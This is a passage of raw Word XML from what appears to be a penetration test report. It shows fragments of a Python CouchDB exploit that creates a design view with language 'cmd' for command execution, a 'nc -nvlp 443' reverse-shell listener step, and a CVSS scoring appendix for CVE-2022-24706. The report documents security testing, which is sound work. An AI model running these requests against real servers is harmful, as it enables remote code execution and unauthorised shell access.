      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>temp_view?limit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=10', data='{"language":"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>","map":""}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRP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else:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/_design/test', data='{"_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>id":"_design</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test","views</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":{"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":{"map":""} },"language":"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00DC2939">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2. On the analysis machine:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Run: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nvlp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 443</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Result: </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00673193" w:rsidRDefault="00673193" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00673193">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="590C85CA" wp14:editId="507584E7">
            <wp:extent cx="5943600" cy="1682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82115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00673193">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsia="Calibri" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00C016F1" w:rsidRPr="00C016F1" w:rsidRDefault="00C016F1" w:rsidP="00C016F1"/>
    <w:p w:rsidR="00944875" w:rsidRPr="00F3284B" w:rsidRDefault="008979F6" w:rsidP="00F3284B">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="000000"/>
        </w:pBdr>
        <w:jc w:val="right"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc143392747"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendixes</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc143392748"/>
      <w:r>
        <w:t xml:space="preserve">Appendix A: </w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Vulnerability Score Analysis – CVSS 3.0</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial Black" w:eastAsia="Arial Black" w:hAnsi="Arial Black" w:cs="Arial Black"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidR="00B935B8" w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CVE-2022-24706</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://10.10.10.10:5948</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="008979F6">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Final Vector:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="002848E4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>AV:N</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="002848E4" w:rsidRDefault="008979F6">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Adjusted Scores:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Base Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">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Impact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5.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">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Exploitability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3.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Temporal Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">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CVSS Environmental Score: 8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="002848E4" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">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Modified Impact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5.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Overall CVSS Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="00B935B8">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRPr="002848E4" w:rsidRDefault="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Risk Rating: High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00944875" w:rsidRDefault="00944875">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
